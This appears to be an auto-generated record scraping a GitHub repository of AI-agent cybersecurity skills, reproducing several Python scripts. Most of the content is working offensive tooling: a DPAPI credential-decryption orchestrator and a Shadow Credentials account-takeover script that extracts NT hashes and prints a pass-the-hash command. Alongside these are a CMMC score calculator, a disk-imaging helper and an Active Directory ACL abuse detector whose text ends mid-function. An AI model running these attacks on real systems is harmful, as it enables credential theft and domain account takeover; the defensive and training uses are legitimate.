# Forensic Learning Record (Deep Inspection): mukul975/Anthropic-Cybersecurity-Skills

> **Canonical Artifact**: `07_PROJECT_LEARNING/mukul975-anthropic-cybersecurity-skills-learnings.md`  
> **Source Platform**: GitHub ([https://github.com/mukul975/Anthropic-Cybersecurity-Skills](https://github.com/mukul975/Anthropic-Cybersecurity-Skills))  
> **Harvest Method**: Full-Spectrum Deep Extraction (Patches, Diffs, Source Code, Post-Mortems)  
> **Harvest Timestamp**: 2026-09-30T17:15:26.371Z  
> **Compliance State**: Free Tier Guaranteed | Strict Rate-Limit Backoff Honored  

---

## 1. Context & Architectural Overview
- **Repository / Resource**: `mukul975/Anthropic-Cybersecurity-Skills`
- **Description**: 817 structured cybersecurity skills for AI agents · Mapped to 6 frameworks: MITRE ATT&CK, NIST CSF 2.0, MITRE ATLAS, D3FEND, NIST AI RMF & MITRE F3 (Fight Fraud) · agentskills.io standard · Works with Claude Code, GitHub Copilot, Codex CLI, Cursor, Gemini CLI & 20+ platforms · 29 security domains · Apache 2.0
- **Primary Language / Ecosystem**: Python
- **Discovered Manifests / Configurations**: README.md
- **Stars / Engagement**: 33616 stars

---

## 2. Multi-Dimensional 8-Axis Investigation & Real Code Patches

### D1: Architecture & Structural Boundaries
- Entry configurations inspected via direct stream: README.md.
- Evaluated system abstractions and modular contracts.

### Core Architecture Module: `skills/abusing-dpapi-for-credential-access/scripts/agent.py`
```
#!/usr/bin/env python3
# For authorized penetration testing and educational environments only.
# Usage against targets without prior mutual written consent is illegal.
# It is the end user's responsibility to obey all applicable laws.
"""DPAPI triage orchestrator.

Locates DPAPI artifacts (master keys, Credential Manager blobs, Vault entries)
on a mounted/exfiltrated user profile and drives SharpDPAPI (on Windows) or
Impacket's dpapi.py (cross-platform) to decrypt them with a supplied password,
NTLM hash, or domain backup key (.pvk).

This is an operator helper: it builds and runs the real tool commands and
parses their output; it does not reimplement DPAPI cryptography.
"""

import argparse
import os
import shutil
import subprocess
import sys
from datetime import datetime, timezone

# Standard relative locations inside a Windows user profile.
PROTECT_REL = os.path.join("AppData", "Roaming", "Microsoft", "Protect")
CRED_REL = os.path.join("AppData", "Local", "Microsoft", "Credentials")
VAULT_LOCAL_REL = os.path.join("AppData", "Local", "Microsoft", "Vault")
VAULT_ROAM_REL = os.path.join("AppData", "Roaming", "Microsoft", "Vault")


def find_tool(candidates):
    """Return the first available tool path from candidates, else None."""
    for name in candidates:
        path = shutil.which(name)
        if path:
            return path
    return None


def enumerate_artifacts(profile):
    """Walk a user profile and collect DPAPI artifact file paths."""
    found = {"masterkeys": [], "credentials": [], "vaults": []}
    mapping = {
        "masterkeys": os.path.join(profile, PROTECT_REL),
        "credentials": os.path.join(profile, CRED_REL),
        "vaults": os.path.join(profile, VAULT_LOCAL_REL),
    }
    for key, base in mapping.items():
        if not os.path.isdir(base):
            continue
        for root, _dirs, files in os.walk(base):
            for fname in files:
                # Master keys are GUID-named; skip preferred/BK marker files noise.
                found[key].append(os.path.join(root, fname))
    # Also include roaming vault if present.
    vroam = os.path.join(profile, VAULT_ROAM_REL)
    if os.path.isdir(vroam):
        for root, _dirs, files in os.walk(vroam):
            for fname in files:
                found["vaults"].append(os.path.join(root, fname))
    return found


def run_cmd(cmd, timeout):
    """Run an external command and return (rc, stdout, stderr)."""
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return proc.returncode, proc.stdout, proc.stderr
    except FileNotFoundError:
        return 127, "", f"tool not found: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return 124, "", f"timeout after {timeout}s"


def decrypt_masterkey_impacket(tool, mk_file, pvk, timeout):
    """Decrypt one master key file via impacket-dpapi using a backup .pvk."""
    cmd = [tool, "masterkey", "-file", mk_file, "-pvk", pvk]
    rc, out, err = run_cmd(cmd, timeout)
    return {"file": mk_file, "rc": rc, "output": (out or err).strip()[:2000]}


def sharpdpapi_triage(tool, profile, pvk, password, ntlm, timeout):
    """Build and run a SharpDPAPI triage command appropriate to the inputs."""
    cmd = [tool, "triage"]
    if pvk:
        cmd += [f"/pvk:{pvk}"]
    elif password:
        cmd += [f"/password:{password}"]
    elif ntlm:
        cmd += [f"/ntlm:{ntlm}"]
    else:
        cmd += ["/unprotect"]
    rc, out, err = run_cmd(cmd, timeout)
    return {"rc": rc, "output": (out or err).strip()}


def main():
    parser = argparse.ArgumentParser(description="Authorized DPAPI triage helper")
    parser.add_argument("--profile", help="Path to a (mounted) Windows user profile")
    parser.add_argument("--pvk", help="Domain DPAPI backup key (.pvk)")
    parser.add_argument("--password", help="User plaintext password")
    parser.add_argument("--ntlm", help="User NTLM hash")
    parser.add_argument("--mode", choices=["enumerate", "impacket", "sharpdpapi"],
                        default="enumerate",
                        help="enumerate artifacts, or drive a decryption tool")
    parser.add_argument("--timeout", type=int, default=120, help="Per-command timeout")
    args = parser.parse_args()

    ts = datetime.now(timezone.utc).isoformat()
    print(f"[*] DPAPI triage helper — {ts}")
    print("[!] Authorized use only. Confirm rules-of-engagement before proceeding.\n")

    if args.mode in ("enumerate", "impacket"):
        if not args.profile or not os.path.isdir(args.profile):
            print("[!] --profile must point to an existing user profile directory",
                  file=sys.stderr)
            sys.exit(2)
        artifacts = enumerate_artifacts(args.profile)
        for kind, items in artifacts.items():
            print(f"--- {kind.upper()} ({len(items)}) ---")
            for p in items:
                print(f"  {p}")
        if args.mode == "impacket":
            if not args.pvk:
                print("\n[!] --pvk required for impacket master key decryption",
                      file=sys.stderr)
                sys.exit(2)
            tool = find_tool(["impacket-dpapi", "dpapi.py"])
            if not tool:
                print("[!] impacket-dpapi not found. Install: pipx install impacket",
                      file=sys.stderr)
                sys.exit(2)
            print("\n=== Decrypting master keys with backup key ===")
            for mk in artifacts["masterkeys"]:
                res = decrypt_masterkey_impacket(tool, mk, args.pvk, args.timeout)
                print(f"  [{res['rc']}] {res['file']}")
                if res["output"]:
                    print(f"      {res['output'][:300]}")
        return

    # sharpdpapi mode (Windows operator host)
    tool = find_tool(["SharpDPAPI.exe", "SharpDPAPI"])
    if not tool:
        print("[!] SharpDPAPI not found on PATH. Build from "
              "https://github.com/GhostPack/SharpDPAPI", file=sys.stderr)
        sys.exit(2)
    result = sharpdpapi_triage(tool, args.profile, args.pvk, args.password,
                               args.ntlm, args.timeout)
    print("=== SharpDPAPI triage ===")
    print(result["output"])
    sys.exit(0 if result["rc"] == 0 else 1)


if __name__ == "__main__":
    main()

```

### Core Architecture Module: `skills/abusing-shadow-credentials-for-privesc/scripts/agent.py`
```
#!/usr/bin/env python3
"""
shadowcred_takeover.py — Orchestrate a Shadow Credentials account takeover.

Wraps the real `certipy shadow auto` workflow (and optionally pyWhisker +
PKINITtools) to add a Key Credential to a target's msDS-KeyCredentialLink,
recover the NT hash via PKINIT, and clean up. Parses the tool output to surface
the recovered NT hash and TGT path.

Authorized use only. Requires write access over the target's
msDS-KeyCredentialLink and a DC running Windows Server 2016+ with PKINIT.

Install:
    pipx install certipy-ad
    git clone https://github.com/ShutdownRepo/pywhisker
    git clone https://github.com/dirkjanm/PKINITtools

Examples:
    python shadowcred_takeover.py certipy -u attacker@corp.local -p 'Passw0rd!' \
        --dc-ip 10.0.0.100 --target 'WS01$'
    python shadowcred_takeover.py pywhisker -d corp.local -u attacker \
        -p 'Passw0rd!' --dc-ip 10.0.0.100 --target victim \
        --pywhisker ./pywhisker/pywhisker.py
"""
import argparse
import os
import re
import shutil
import subprocess
import sys


def _which_or_die(binary, hint):
    if shutil.which(binary) is None and not os.path.exists(binary):
        sys.exit(f"[!] '{binary}' not found. {hint}")


def run(cmd, timeout=600):
    print("[*] Running:", " ".join(cmd))
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        sys.exit(f"[!] Command timed out after {timeout}s.")
    out = proc.stdout + proc.stderr
    print(out)
    return proc.returncode, out


def parse_nthash(text):
    """Certipy prints 'Got hash for ...: aad3b...:<NT>'. Extract the NT half."""
    m = re.search(r"[Gg]ot hash for .*?:\s*([0-9a-fA-F]{32}):([0-9a-fA-F]{32})", text)
    if m:
        return m.group(2)
    m = re.search(r"\b[0-9a-fA-F]{32}:([0-9a-fA-F]{32})\b", text)
    return m.group(1) if m else None


def certipy_flow(args):
    _which_or_die("certipy", "Install with: pipx install certipy-ad")
    cmd = ["certipy", "shadow", "auto",
           "-u", args.user, "-dc-ip", args.dc_ip, "-account", args.target]
    if args.password:
        cmd += ["-p", args.password]
    elif args.hashes:
        cmd += ["-hashes", args.hashes]
    elif args.kerberos:
        cmd += ["-k", "-no-pass"]
    else:
        sys.exit("[!] Provide -p, --hashes, or -k.")
    if args.ns:
        cmd += ["-ns", args.ns, "-dns-tcp"]
    rc, out = run(cmd)
    if rc != 0:
        sys.exit("[!] certipy shadow auto failed.")
    nt = parse_nthash(out)
    if nt:
        print(f"\n[+] Recovered NT hash for {args.target}: {nt}")
        print(f"[+] Reuse it: nxc smb {args.dc_ip} -u {args.target.rstrip('$')} -H {nt}")
    else:
        print("[!] Could not auto-extract NT hash; review output above.")


def pywhisker_flow(args):
    if not args.pywhisker or not os.path.exists(args.pywhisker):
        sys.exit("[!] --pywhisker must point to pywhisker.py")
    base = "shadow_" + args.target.rstrip("$")
    cmd = ["python3", args.pywhisker, "-d", args.domain, "-u", args.user,
           "--target", args.target, "--action", "add", "--filename", base]
    if args.password:
        cmd += ["-p", args.password]
    elif args.kerberos:
        cmd += ["-k", "--no-pass"]
    else:
        sys.exit("[!] Provide -p or -k.")
    if args.dc_ip:
        cmd += ["--dc-ip", args.dc_ip]
    rc, out = run(cmd)
    if rc != 0:
        sys.exit("[!] pyWhisker add failed.")
    pfx_pass = None
    m = re.search(r"[Pp]assword(?: for the PFX)?:\s*(\S+)", out)
    if m:
        pfx_pass = m.group(1)
    print(f"\n[+] Key Credential added. PFX: {base}.pfx  PFX-pass: {pfx_pass}")
    print("[+] Next, request a TGT with PKINITtools:")
    print(f"    python3 gettgtpkinit.py -cert-pfx {base}.pfx -pfx-pass {pfx_pass} "
          f"{args.domain}/{args.target.rstrip('$')} {base}.ccache")
    print("    export KRB5CCNAME=%s.ccache" % base)
    print(f"    python3 getnthash.py -key <AS-REP-KEY> {args.domain}/{args.target.rstrip('$')}")
    print("[!] Remember to clean up the injected Key Credential when done:")
    print(f"    python3 {args.pywhisker} -d {args.domain} -u {args.user} "
          f"--target {args.target} --action clear")


def main():
    ap = argparse.ArgumentParser(description="Shadow Credentials takeover orchestrator.")
    sub = ap.add_subparsers(dest="mode", required=True)

    c = sub.add_parser("certipy", help="Use certipy shadow auto (end to end)")
    c.add_argument("-u", "--user", required=True, help="attacker@domain")
    c.add_argument("-p", "--password")
    c.add_argument("--hashes")
    c.add_argument("-k", "--kerberos", action="store_true")
    c.add_argument("--dc-ip", required=True, dest="dc_ip")
    c.add_argument("--target", required=True, help="victim or WS01$")
    c.add_argument("--ns")

    w = sub.add_parser("pywhisker", help="Use pyWhisker add (manual PKINIT after)")
    w.add_argument("-d", "--domain", required=True)
    w.add_argument("-u", "--user", required=True)
    w.add_argument("-p", "--password")
    w.add_argument("-k", "--kerberos", action="store_true")
    w.add_argument("--dc-ip", dest="dc_ip")
    w.add_argument("--target", required=True)
    w.add_argument("--pywhisker", required=True, help="Path to pywhisker.py")

    args = ap.parse_args()
    if args.mode == "certipy":
        certipy_flow(args)
    else:
        pywhisker_flow(args)


if __name__ == "__main__":
    main()

```

### Core Architecture Module: `skills/achieving-cmmc-level-2-compliance/scripts/process.py`
```
#!/usr/bin/env python3
"""
CMMC Level 2 / NIST SP 800-171 Rev 2 SPRS score calculator.

Implements the DoD Assessment Methodology arithmetic: start at 110 and subtract
the weighted value (1, 3, or 5) of each NOT MET requirement, with partial credit
for the small set of requirements that allow it. Reports the SPRS score, the gap
to a perfect 110 and to the 88-point (80%) conditional-certification threshold,
and flags higher-weighted unmet requirements whose POA&M eligibility must be
verified against 32 CFR Part 170.

NOTE: per-requirement point weights are defined by the DoD NIST SP 800-171
Assessment Methodology. Supply each requirement's official weight in the input
(this tool does not invent weights). Use status 'partial' with 'partial_deduction'
only for requirements the methodology allows partial credit on (e.g., 3.5.3 MFA,
3.13.11 FIPS crypto).

Input JSON shape:
{
  "org": {"name": "Acme Defense LLC", "scope": "CUI enclave"},
  "requirements": [
    {"id": "3.1.1",  "family": "3.1", "status": "met",      "weight": 5},
    {"id": "3.5.3",  "family": "3.5", "status": "partial",  "weight": 5, "partial_deduction": 3},
    {"id": "3.3.1",  "family": "3.3", "status": "not_met",  "weight": 5},
    {"id": "3.8.9",  "family": "3.8", "status": "not_met",  "weight": 1},
    {"id": "3.2.1",  "family": "3.2", "status": "na",       "weight": 1}
  ]
}

status: met | not_met | partial | na

Usage:
  python process.py --input controls.json [--output readiness.md]
  python process.py --input controls.json --require-conditional   # exit 1 if score < 88
"""

import argparse
import json
import sys

START_SCORE = 110
CONDITIONAL_THRESHOLD = 88   # 80% of 110
VALID_STATUS = {"met", "not_met", "partial", "na"}
VALID_WEIGHTS = {1, 3, 5}


def compute(data):
    reqs = data.get("requirements", [])
    if not reqs:
        raise ValueError("requirements list is required")

    deductions = 0
    counts = {"met": 0, "not_met": 0, "partial": 0, "na": 0}
    poam_flags = []   # higher-weight unmet -> verify POA&M eligibility
    by_family = {}    # family -> {met,not_met,partial,na}
    detail = []

    for r in reqs:
        rid = r.get("id", "?")
        status = r.get("status")
        weight = r.get("weight")
        if status not in VALID_STATUS:
            raise ValueError(f"{rid}: status '{status}' invalid (met|not_met|partial|na)")
        if status in ("not_met", "partial", "met") and weight not in VALID_WEIGHTS:
            raise ValueError(f"{rid}: weight '{weight}' invalid (must be 1, 3, or 5)")

        fam = r.get("family", rid.rsplit(".", 1)[0])
        fam_rec = by_family.setdefault(fam, {"met": 0, "not_met": 0, "partial": 0, "na": 0})
        fam_rec[status] += 1
        counts[status] += 1

        ded = 0
        if status == "not_met":
            ded = weight
            if weight > 1:
                poam_flags.append((rid, weight))
        elif status == "partial":
            ded = r.get("partial_deduction")
            if ded is None:
                raise ValueError(f"{rid}: status 'partial' requires 'partial_deduction'")
            if ded < 0 or ded > weight:
                raise ValueError(f"{rid}: partial_deduction {ded} out of range (0..{weight})")
            if ded > 1:
                poam_flags.append((rid, ded))
        deductions += ded
        detail.append((rid, fam, status, weight, ded))

    score = START_SCORE - deductions
    return {
        "score": score,
        "deductions": deductions,
        "counts": counts,
        "by_family": by_family,
        "poam_flags": poam_flags,
        "detail": detail,
    }


def render(data, res):
    org = data.get("org", {})
    lines = []
    lines.append(f"# CMMC Level 2 Readiness - {org.get('name','Organization')}")
    lines.append("")
    if org.get("scope"):
        lines.append(f"- **Scope:** {org['scope']}")
    lines.append("")

    score = res["score"]
    lines.append("## SPRS Score (DoD Assessment Methodology)")
    lines.append("")
    lines.append(f"- **Score:** **{score}** / 110  (started at 110, deducted {res['deductions']})")
    lines.append(f"- **Gap to perfect (110):** {110 - score}")
    if score >= CONDITIONAL_THRESHOLD:
        lines.append(f"- **Conditional threshold (>= {CONDITIONAL_THRESHOLD}):** MET "
                     f"(margin {score - CONDITIONAL_THRESHOLD}) - eligible for Conditional status "
                     "if remaining items are POA&M-eligible.")
    else:
        lines.append(f"- **Conditional threshold (>= {CONDITIONAL_THRESHOLD}):** NOT MET "
                     f"(short by {CONDITIONAL_THRESHOLD - score}) - not eligible for Conditional "
                     "certification until the score reaches 88.")
    c = res["counts"]
    lines.append(f"- **Status tally:** met {c['met']}, partial {c['partial']}, "
                 f"not met {c['not_met']}, N/A {c['na']}")
    lines.append("")

    # by family
    lines.append("## Status by family")
    lines.append("")
    lines.append("| Family | Met | Partial | Not Met | N/A |")
    lines.append("|---|---|---|---|---|")
    for fam in sorted(res["by_family"]):
        f = res["by_family"][fam]
        lines.append(f"| {fam} | {f['met']} | {f['partial']} | {f['not_met']} | {f['na']} |")
    lines.append("")

    # POA&M eligibility flags
    lines.append("## POA&M eligibility check")
    lines.append("")
    if not res["poam_flags"]:
        lines.append("No unmet requirement carries more than 1 point of deduction. "
                     "Remaining gaps are most likely POA&M-eligible (still verify against 32 CFR Part 170).")
    else:
        lines.append("The following unmet/partial requirements carry **> 1 point**. The highest-weighted "
                     "security requirements generally **cannot** sit on a POA&M - verify each against "
                     "32 CFR Part 170 before relying on Conditional status:")
        lines.append("")
        lines.append("| Requirement | Points lost |")
        lines.append("|---|---|")
        for rid, w in sorted(res["poam_flags"], key=lambda x: -x[1]):
            lines.append(f"| {rid} | {w} |")
    lines.append("")
    lines.append("> All POA&M items must be closed within **180 days** to convert Conditional -> Final.")

    return "\n".join(lines)


def main():
    ap = argparse.ArgumentParser(description="CMMC L2 / NIST 800-171 SPRS score calculator")
    ap.add_argument("--input", "-i", required=True, help="Path to control-status JSON")
    ap.add_argument("--output", "-o", help="Write Markdown readiness report to this path")
    ap.add_argument("--require-conditional", action="store_true",
                    help="Exit non-zero if SPRS score < 88 (conditional threshold)")
    args = ap.parse_args()

    try:
        with open(args.input) as f:
            data = json.load(f)
    except (OSError, json.JSONDecodeError) as e:
        print(f"ERROR: could not read input JSON: {e}", file=sys.stderr)
        return 2

    try:
        res = compute(data)
        md = render(data, res)
    except ValueError as e:
        print(f"ERROR: {e}", file=sys.stderr)
        return 2

    if args.output:
        with open(args.output, "w") as f:
            f.write(md + "\n")
        print(f"Readiness report written to {args.output}", file=sys.stderr)
    else:
        print(md)

    print(f"SPRS score {res['score']}/110 (deductions {res['deductions']}; "
          f"not met {res['counts']['not_met']}, partial {res['counts']['partial']}).",
          file=sys.stderr)

    if args.require_conditional and res["score"] < CONDITIONAL_THRESHOLD:
        print(f"FAIL: score {res['score']} < {CONDITIONAL_THRESHOLD} conditional threshold.",
              file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())

```

### Core Architecture Module: `skills/acquiring-disk-image-with-dd-and-dcfldd/scripts/agent.py`
```
#!/usr/bin/env python3
"""Forensic disk image acquisition agent using dd and dcfldd with hash verification."""

import shlex
import subprocess
import hashlib
import os
import datetime
import json


def run_cmd(cmd, capture=True):
    """Execute a command and return output."""
    if isinstance(cmd, str):
        cmd = shlex.split(cmd)
    result = subprocess.run(cmd, capture_output=capture, text=True, timeout=120)
    return result.stdout.strip(), result.stderr.strip(), result.returncode


def list_block_devices():
    """Enumerate connected block devices."""
    stdout, _, rc = run_cmd("lsblk -J -o NAME,SIZE,TYPE,MOUNTPOINT,MODEL,SERIAL,RO")
    if rc == 0 and stdout:
        return json.loads(stdout)
    return {"blockdevices": []}


def check_write_protection(device):
    """Verify a device is set to read-only mode."""
    stdout, _, rc = run_cmd(f"blockdev --getro {device}")
    if rc == 0:
        return stdout.strip() == "1"
    return False


def enable_write_protection(device):
    """Enable software write-blocking on the target device."""
    _, _, rc = run_cmd(f"blockdev --setro {device}")
    if rc != 0:
        print(f"[ERROR] Failed to set {device} read-only. Run as root.")
        return False
    if check_write_protection(device):
        print(f"[OK] Write protection enabled on {device}")
        return True
    print(f"[ERROR] Write protection verification failed for {device}")
    return False


def compute_hash(path, algorithm="sha256", block_size=65536):
    """Compute the SHA-256 or MD5 hash of a file or device."""
    h = hashlib.new(algorithm)
    try:
        with open(path, "rb") as f:
            while True:
                block = f.read(block_size)
                if not block:
                    break
                h.update(block)
    except PermissionError:
        print(f"[ERROR] Permission denied reading {path}. Run as root.")
        return None
    except FileNotFoundError:
        print(f"[ERROR] Path not found: {path}")
        return None
    return h.hexdigest()


def acquire_with_dd(source, destination, block_size=4096, log_file=None):
    """Acquire a forensic image using dd with error handling."""
    dd_cmd = [
        "dd", f"if={source}", f"of={destination}",
        f"bs={block_size}", "conv=noerror,sync", "status=progress"
    ]
    print(f"[*] Starting dd acquisition: {source} -> {destination}")
    print(f"[*] Block size: {block_size}")
    start = datetime.datetime.utcnow()
    if log_file:
        dd_proc = subprocess.run(dd_cmd, capture_output=True, text=True, timeout=120)
        combined = (dd_proc.stdout or "") + (dd_proc.stderr or "")
        with open(log_file, "w") as lf:
            lf.write(combined)
        rc = dd_proc.returncode
    else:
        result = subprocess.run(dd_cmd, text=True, timeout=120)
        rc = result.returncode
    elapsed = (datetime.datetime.utcnow() - start).total_seconds()
    print(f"[*] Acquisition completed in {elapsed:.1f} seconds (rc={rc})")
    return rc == 0


def acquire_with_dcfldd(source, destination, hash_alg="sha256", hash_log=None,
                        error_log=None, block_size=4096, split_size=None):
    """Acquire a forensic image using dcfldd with built-in hashing."""
    cmd = [
        "dcfldd", f"if={source}", f"of={destination}",
        f"bs={block_size}", "conv=noerror,sync",
        f"hash={hash_alg}", "hashwindow=1G",
    ]
    if hash_log:
        cmd.append(f"hashlog={hash_log}")
    if error_log:
        cmd.append(f"errlog={error_log}")
    if split_size:
        cmd.extend([f"split={split_size}", "splitformat=aa"])
    print(f"[*] Starting dcfldd acquisition: {source} -> {destination}")
    start = datetime.datetime.utcnow()
    result = subprocess.run(cmd, text=True, timeout=120)
    rc = result.returncode
    elapsed = (datetime.datetime.utcnow() - start).total_seconds()
    print(f"[*] dcfldd completed in {elapsed:.1f} seconds (rc={rc})")
    return rc == 0


def verify_image(source, image_path, algorithm="sha256"):
    """Verify image integrity by comparing hashes of source and acquired image."""
    print(f"[*] Computing {algorithm} hash of source: {source}")
    source_hash = compute_hash(source, algorithm)
    print(f"    Source hash:  {source_hash}")
    print(f"[*] Computing {algorithm} hash of image: {image_path}")
    image_hash = compute_hash(image_path, algorithm)
    print(f"    Image hash:   {image_hash}")
    if source_hash and image_hash:
        match = source_hash == image_hash
        status = "PASSED" if match else "FAILED"
        print(f"[{'OK' if match else 'FAIL'}] Verification: {status}")
        return match, source_hash, image_hash
    return False, source_hash, image_hash


def generate_report(case_dir, source_device, image_path, tool_used,
                    source_hash, image_hash, verified, elapsed_seconds=0):
    """Generate a forensic acquisition report."""
    report = {
        "report_type": "Disk Image Acquisition",
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "case_directory": case_dir,
        "source_device": source_device,
        "image_file": image_path,
        "acquisition_tool": tool_used,
        "block_size": 4096,
        "source_hash_sha256": source_hash,
        "image_hash_sha256": image_hash,
        "hash_verified": verified,
        "duration_seconds": elapsed_seconds,
    }
    report_path = os.path.join(case_dir, "acquisition_report.json")
    with open(report_path, "w") as f:
        json.dump(report, f, indent=2)
    print(f"[*] Report saved to {report_path}")
    return report


if __name__ == "__main__":
    print("=" * 60)
    print("Forensic Disk Image Acquisition Agent")
    print("Tools: dd / dcfldd with SHA-256 verification")
    print("=" * 60)

    # Demo: list block devices
    print("\n[*] Enumerating block devices...")
    devices = list_block_devices()
    for dev in devices.get("blockdevices", []):
        name = dev.get("name", "?")
        size = dev.get("size", "?")
        dtype = dev.get("type", "?")
        model = dev.get("model", "N/A")
        ro = "RO" if dev.get("ro") else "RW"
        print(f"    /dev/{name}  {size}  {dtype}  {model}  [{ro}]")

    # Demo workflow (dry run)
    demo_source = "/dev/sdb"
    demo_case = "/cases/demo-case/images"
    demo_image = os.path.join(demo_case, "evidence.dd")

    print(f"\n[DEMO] Acquisition workflow for {demo_source}:")
    print(f"  1. Enable write protection: blockdev --setro {demo_source}")
    print(f"  2. Acquire with dcfldd: dcfldd if={demo_source} of={demo_image} "
          f"hash=sha256 hashwindow=1G bs=4096 conv=noerror,sync")
    print(f"  3. Verify: compare SHA-256 of {demo_source} and {demo_image}")
    print(f"  4. Generate acquisition report with chain-of-custody metadata")
    print("\n[*] Agent ready. Provide a source device and case directory to begin.")

```

### Core Architecture Module: `skills/analyzing-active-directory-acl-abuse/scripts/agent.py`
```
#!/usr/bin/env python3
"""Active Directory ACL abuse detection using ldap3 to find dangerous permissions."""

import argparse
import json
import struct

from ldap3 import Server, Connection, ALL, NTLM, SUBTREE


DANGEROUS_MASKS = {
    "GenericAll": 0x10000000,
    "GenericWrite": 0x40000000,
    "WriteDACL": 0x00040000,
    "WriteOwner": 0x00080000,
    "WriteProperty": 0x00000020,
    "Self": 0x00000008,
    "ExtendedRight": 0x00000100,
    "DeleteChild": 0x00000002,
    "Delete": 0x00010000,
}

ADMIN_SIDS = {
    "S-1-5-18",
    "S-1-5-32-544",
    "S-1-5-9",
}

ADMIN_RID_SUFFIXES = {
    "-500",
    "-512",
    "-516",
    "-518",
    "-519",
    "-498",
}

ATTACK_PATHS = {
    "GenericAll": {
        "user": "Full control allows password reset, Kerberoasting via SPN, or shadow credential attack",
        "group": "Full control allows adding arbitrary members to the group",
        "computer": "Full control allows resource-based constrained delegation attack",
        "organizationalUnit": "Full control allows linking malicious GPO or moving objects",
    },
    "WriteDACL": {
        "user": "Can modify DACL to grant self GenericAll, then reset password",
        "group": "Can modify DACL to grant self write membership, then add self",
        "computer": "Can modify DACL to grant self full control on machine account",
        "organizationalUnit": "Can modify DACL to gain control over OU child objects",
    },
    "WriteOwner": {
        "user": "Can take ownership then modify DACL to escalate privileges",
        "group": "Can take ownership of group then modify membership",
        "computer": "Can take ownership then configure delegation abuse",
        "organizationalUnit": "Can take ownership then control OU policies",
    },
    "GenericWrite": {
        "user": "Can write scriptPath for logon script execution or modify SPN for Kerberoasting",
        "group": "Can modify group attributes including membership",
        "computer": "Can write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD attack",
        "organizationalUnit": "Can modify OU attributes and link GPO",
    },
}


def is_admin_sid(sid: str, domain_sid: str) -> bool:
    if sid in ADMIN_SIDS:
        return True
    for suffix in ADMIN_RID_SUFFIXES:
        if sid == domain_sid + suffix:
            return True
    return False


def parse_sid(raw: bytes) -> str:
    if len(raw) < 8:
        return ""
    revision = raw[0]
    sub_auth_count = raw[1]
    authority = int.from_bytes(raw[2:8], byteorder="big")
    subs = []
    for i in range(sub_auth_count):
        offset = 8 + i * 4
        if offset + 4 > len(raw):
            break
        subs.append(struct.unpack("<I", raw[offset:offset + 4])[0])
    return f"S-{revision}-{authority}-" + "-".join(str(s) for s in subs)


def parse_acl(descriptor_bytes: bytes) -> list:
    aces = []
    if len(descriptor_bytes) < 20:
        return aces
    revision = descriptor_bytes[0]
    control = struct.unpack("<H", descriptor_bytes[2:4])[0]
    dacl_offset = struct.unpack("<I", descriptor_bytes[16:20])[0]
    if dacl_offset == 0 or dacl_offset >= len(descriptor_bytes):
        return aces
    dacl = descriptor_bytes[dacl_offset:]
    if len(dacl) < 8:
        return aces
    acl_size = struct.unpack("<H", dacl[2:4])[0]
    ace_count = struct.unpack("<H", dacl[4:6])[0]
    offset = 8
    for _ in range(ace_count):
        if offset + 4 > len(dacl):
            break
        ace_type = dacl[offset]
        ace_flags = dacl[offset + 1]
        ace_size = struct.unpack("<H", dacl[offset + 2:offset + 4])[0]
        if ace_size < 4 or offset + ace_size > len(dacl):
            break
        if ace_type in (0x00, 0x05):
            if offset + 8 <= len(dacl):
                access_mask = struct.unpack("<I", dacl[offset + 4:offset + 8])[0]
                sid_offset = offset + 8
                if ace_type == 0x05:
                    sid_offset = offset + 8 + 32
                if sid_offset < offset + ace_size:
                    sid_bytes = dacl[sid_offset:offset + ace_size]
                    sid_str = parse_sid(sid_bytes)
                    matched_perms = []
                    for perm_name, mask_val in DANGEROUS_MASKS.items():
                        if access_mask & mask_val:
                            matched_perms.append(perm_name)
                    if matched_perms:
                        aces.append({
                            "ace_type": "ACCESS_ALLOWED" if ace_type in (0x00, 0x05) else "OTHER",
                            "access_mask": f"0x{access_mask:08x}",
                            "trustee_sid": sid_str,
                            "permissions": matched_perms,
                        })
        offset += ace_size
    return aces


def resolve_sid(conn: Connection, base_dn: str, sid: str) -> str:
    try:
        conn.search(base_dn, f"(objectSid={sid})", attributes=["sAMAccountName", "cn"])
        if conn.entries:
            entry = conn.entries[0]
            return str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else str(entry.cn)
    except Exception:
        pass
    return sid


def get_domain_sid(conn: Connection, base_dn: str) -> str:
    conn.search(base_dn, "(objectClass=domain)", attributes=["objectSid"])
    if conn.entries:
        raw = conn.entries[0].objectSid.raw_values[0]
        return parse_sid(raw)
    return ""


def analyze_acls(dc_ip: str, domain: str, username: str, password: str,
                 target_ou: str) -> dict:
    server = Server(dc_ip, get_info=ALL, use_ssl=False)
    domain_parts = domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in domain_parts)
    search_base = target_ou if target_ou else base_dn
    ntlm_user = f"{domain}\\{username}"

    conn = Connection(server, user=ntlm_user, password=password,
                      authentication=NTLM, auto_bind=True)
    domain_sid = get_domain_sid(conn, base_dn)

    conn.search(
        search_base,
        "(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=organizationalUnit))",
        search_scope=SUBTREE,
        attributes=["distinguishedName", "sAMAccountName", "objectClass", "nTSecurityDescriptor"],
    )

    findings = []
    objects_scanned = 0
    sid_cache = {}

    for entry in conn.entries:
        objects_scanned += 1
        dn = str(entry.distinguishedName)
        obj_classes = [str(c) for c in entry.objectClass.values] if hasattr(entry, "objectClass") else []
        obj_type = "unknown"
        for oc in obj_classes:
            if oc.lower() in ("user", "group", "computer", "organizationalunit"):
                obj_type = oc.lower()
                break

        if not hasattr(entry, "nTSecurityDescriptor"):
            continue
        raw_sd = entry.nTSecurityDescriptor.raw_values
        if not raw_sd:
            continue
        sd_bytes = raw_sd[0]
        aces = parse_acl(sd_bytes)

        for ace in aces:
            trustee_sid = ace["trustee_sid"]
            if is_admin_sid(trustee_sid, domain_sid):
                continue
            if trustee_sid not in sid_cache:
                sid_cache[trustee_sid] = resolve_sid(conn, base_dn, trustee_sid)
            trustee_name = sid_cache[trustee_sid]

            for perm in ace["permissions"]:
                if perm in ("Delete", "DeleteChild", "Self", "WriteProperty", "ExtendedRight"):
                    severity = "medium"
                else:
                    severity = "critical"
